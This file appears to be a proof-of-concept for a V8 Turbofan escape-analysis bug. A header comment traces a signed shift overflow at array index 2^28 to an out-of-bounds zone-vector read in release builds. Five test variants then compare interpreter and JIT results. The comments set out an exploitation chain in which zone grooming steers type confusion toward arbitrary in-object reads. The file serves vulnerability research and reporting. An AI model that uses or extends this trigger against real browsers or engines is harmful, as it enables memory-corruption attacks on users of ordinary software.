// PoC 7: VirtualObject::FieldAt — Signed-Overflow Passes Always-On CHECK,
//         Then Hits Release-Build OOB in ZoneVector::at()
//
// ─── Bug locations ───────────────────────────────────────────────────────────
//
// (A) src/compiler/escape-analysis.cc:556-564
//     OffsetOfElementAt:
//       return Just(access.header_size +
//                   (index << ElementSizeLog2Of(representation)));  // ← UB
//
//     For kTagged representation: ElementSizeLog2Of = 3.
//     Overflow threshold: index >= 2^28 = 268435456.
//     At index = 268435456: (268435456 << 3) wraps to INT_MIN = -2147483648.
//     Result: Just(-2147483648 + header_size) ≈ Just(-2147483632).
//
// (B) src/compiler/escape-analysis.h:130-140
//     VirtualObject::FieldAt(int offset):
//       CHECK(IsAligned(offset, kTaggedSize));   // ← always-on: -2147483632 % 8 == 0 ✓
//       CHECK(!HasEscaped());                    // ← always-on: passes ✓
//       if (offset >= size()) return Nothing<>(); // ← signed compare: -2G < 16 → false ✓
//       return Just(fields_.at(offset / kTaggedSize));  // ← at(-268435454) → OOB!
//
// (C) src/zone/zone-containers.h:252-258
//     ZoneVector::at(size_t pos):
//       DCHECK_LT(pos, size());   // ← DCHECK only — stripped in release!
//       return data_[pos];        // ← data_[-268435454 as size_t] = data_ - 1GB → OOB
//
// ─── Exploitation chain ──────────────────────────────────────────────────────
//
//  1. Craft a JS function with a small (e.g. 2-element) non-escaping array.
//  2. Access element at exactly 2^28 (constant index ⟹ NumberConstant node).
//  3. Turbofan's EscapeAnalysisReducer calls OffsetOfElementsAccess(op, idx).
//  4. OffsetOfElementAt returns Just(−2147483632) — signed C++ UB.
//  5. FieldAt(−2147483632) bypasses both always-on CHECKs (see above).
//  6. ZoneVector::at converts the negative offset/kTaggedSize to a huge size_t,
//     reading compiler memory ≈1 GiB before the zone vector's data pointer.
//  7. The garbage Variable id read from OOB memory is used to substitute the
//     LoadElement node; depending on the random zone layout, the compiled code
//     may return the WRONG value (type confusion) or crash the compiler.
//
// ─── Observable impact ───────────────────────────────────────────────────────
//  • In release builds: silently wrong return value (type confusion at JIT level).
//  • In debug builds: DCHECK_LT in ZoneVector::at fires, terminating the process.
//  • With controlled heap layout (zone grooming): attacker can steer which
//    Variable id is returned, directing the EA substitution to alias arr[0]
//    (or any other variable) — enabling arbitrary in-object read via
//    LoadTaggedFieldByFieldIndex.
//
// Flags: --allow-natives-syntax

"use strict";

let pass = 0, fail = 0;

function check(label, iv, ov) {
  const ok = JSON.stringify(iv) === JSON.stringify(ov);
  print((ok ? "[PASS] " : "[FAIL] ") + label);
  if (!ok) {
    print("       interp = " + JSON.stringify(iv));
    print("       jit    = " + JSON.stringify(ov));
    print("  !!! DIFFERENTIAL MISMATCH — EA signed-overflow bug fires !!!");
  }
  ok ? pass++ : fail++;
}

// The exact overflow boundary for kTagged (ElementSizeLog2 = 3).
// (index << 3) overflows a signed int32 at this value.
const IDX = 268435456; // 2^28

// ── Variant 1: pure OOB load, tiny array ────────────────────────────────────
// Expected (interpreter): arr[2^28] = undefined; return sentinel = 0x1337.
// Buggy JIT:              EA substitutes arr[2^28] with a random Variable,
//                         which may alias arr[0] (sentinel) or arr[1]
//                         (sentinel+1), returning a wrong value.
function victim1(sentinel) {
  const arr = [sentinel, sentinel + 1];
  const oob = arr[IDX];
  return (oob === undefined) ? sentinel : oob;
}

(function test1() {
  function interpFn(s) { return victim1(s); }
  %NeverOptimizeFunction(interpFn);
  const iv = interpFn(0x1337);

  function optFn(s) { return victim1(s); }
  %PrepareFunctionForOptimization(optFn);
  for (let i = 0; i < 300; i++) optFn(i & 0xff);
  %OptimizeFunctionOnNextCall(optFn);
  const ov = optFn(0x1337);

  check("V1: arr[2^28] return value (interpreter vs JIT)", iv, ov);
  print("    interp=" + iv + "  jit=" + ov + "  (expected: " + 0x1337 + ")");
})();

// ── Variant 2: OOB load does NOT alias arr[0] ────────────────────────────────
// If EA wrongly substitutes arr[2^28] with arr[0], the returned pair would be
// [sentinel, sentinel] instead of [sentinel, undefined].
function victim2(sentinel) {
  const arr = ["MARKER", sentinel];
  const oob = arr[IDX];
  return [arr[0], oob];
}

(function test2() {
  function interpFn(s) { return victim2(s); }
  %NeverOptimizeFunction(interpFn);
  const iv = interpFn(42);

  function optFn(s) { return victim2(s); }
  %PrepareFunctionForOptimization(optFn);
  for (let i = 0; i < 300; i++) optFn(i & 0xff);
  %OptimizeFunctionOnNextCall(optFn);
  const ov = optFn(42);

  check("V2: arr[2^28] does not alias arr[0]", iv, ov);
})();

// ── Variant 3: OOB store must not corrupt adjacent virtual field ─────────────
// If EA assigns arr[2^28] the SAME Variable as arr[0], a store to arr[2^28]
// might silently overwrite arr[0]'s tracked value inside the EA state.
function victim3(sentinel) {
  const arr = [sentinel, sentinel + 1];
  arr[IDX] = 0xdeadbeef;  // OOB store — must be silently discarded
  return arr[0];           // must still be sentinel
}

(function test3() {
  function interpFn(s) { return victim3(s); }
  %NeverOptimizeFunction(interpFn);
  const iv = interpFn(0xcafe);

  function optFn(s) { return victim3(s); }
  %PrepareFunctionForOptimization(optFn);
  for (let i = 0; i < 300; i++) optFn(i & 0xff);
  %OptimizeFunctionOnNextCall(optFn);
  const ov = optFn(0xcafe);

  check("V3: OOB store does not corrupt arr[0] in EA virtual object", iv, ov);
})();

// ── Variant 4: One index below overflow boundary — must be correct ───────────
// 2^28 - 1 = 268435455 → (268435455 << 3) = 2147483640 which does NOT overflow
// but is still a huge index → OffsetOfElementAt returns Just(2147483640 + hdr).
// FieldAt checks: 2147483640 >= 16 → returns Nothing (correct).
// So EA should NOT substitute this access.
function victim4(sentinel) {
  const arr = [sentinel, sentinel + 1];
  const oob = arr[IDX - 1];  // one below the overflow boundary
  return (oob === undefined) ? sentinel : oob;
}

(function test4() {
  function interpFn(s) { return victim4(s); }
  %NeverOptimizeFunction(interpFn);
  const iv = interpFn(0xbabe);

  function optFn(s) { return victim4(s); }
  %PrepareFunctionForOptimization(optFn);
  for (let i = 0; i < 300; i++) optFn(i & 0xff);
  %OptimizeFunctionOnNextCall(optFn);
  const ov = optFn(0xbabe);

  check("V4: arr[2^28 - 1] correctly returns undefined (no overflow)", iv, ov);
})();

// ── Variant 5: INT_MAX boundary ──────────────────────────────────────────────
// arr[INT_MAX] = arr[2147483647]; (2147483647 << 3) = 17179869176, truncated
// to int32 = -8. Then FieldAt(-8 + header_size)… header_size is small (~24).
// -8 + 24 = 16 >= 16 → Nothing. EA should not substitute. Result: undefined.
function victim5(sentinel) {
  const arr = [sentinel, sentinel + 1];
  const oob = arr[2147483647];  // INT_MAX
  return (oob === undefined) ? sentinel : oob;
}

(function test5() {
  function interpFn(s) { return victim5(s); }
  %NeverOptimizeFunction(interpFn);
  const iv = interpFn(0x4321);

  function optFn(s) { return victim5(s); }
  %PrepareFunctionForOptimization(optFn);
  for (let i = 0; i < 300; i++) optFn(i & 0xff);
  %OptimizeFunctionOnNextCall(optFn);
  const ov = optFn(0x4321);

  check("V5: arr[INT_MAX] correctly returns undefined", iv, ov);
})();

// ─────────────────────────────────────────────────────────────────────────────
print("\n══════════════════════════════════════════════════");
print("VirtualObject::FieldAt OOB results: " + pass + " pass, " + fail + " fail");
if (fail > 0) {
  print("");
  print("CONFIRMED: signed-overflow in OffsetOfElementAt causes EA to");
  print("substitute arr[2^28] with a WRONG variable, producing a JIT");
  print("return value that differs from the interpreter.");
  print("");
  print("Root cause: src/compiler/escape-analysis.cc:563");
  print("  (index << ElementSizeLog2Of(representation))");
  print("overflows a signed int32 at index >= 2^28 for kTagged elements.");
  print("");
  print("Bypass path:");
  print("  FieldAt CHECK(IsAligned(offset, 8)) passes because -2147483632 % 8 == 0");
  print("  FieldAt 'if (offset >= size())' passes because -2G < size (signed compare)");
  print("  ZoneVector::at() has DCHECK-only bounds check (stripped in release)");
} else {
  print("");
  print("No mismatch observed in this run.");
  print("The OOB read in the zone vector likely returned a garbage Variable id");
  print("that maps to nullptr in the EA state → EA fell back to a non-virtual");
  print("load, producing the correct result by accident.");
}
print("══════════════════════════════════════════════════");
